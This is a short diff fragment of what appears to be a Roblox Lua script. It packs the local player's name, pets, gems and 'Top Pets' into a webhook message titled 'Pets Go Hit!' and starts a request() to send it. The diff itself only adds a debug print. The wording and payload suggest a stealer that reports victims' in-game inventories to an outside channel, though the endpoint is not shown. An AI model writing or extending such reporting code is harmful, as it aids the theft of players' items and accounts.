@@ -33,6 +33,7 @@ log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer
 else
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..tp..'","name":"Top Pets","inline":false}],"title":"Pets Go Hit!"}],"tts":false,"content":""}'
 end
+print(tp,msg,log)
 local response =
         request(
         {
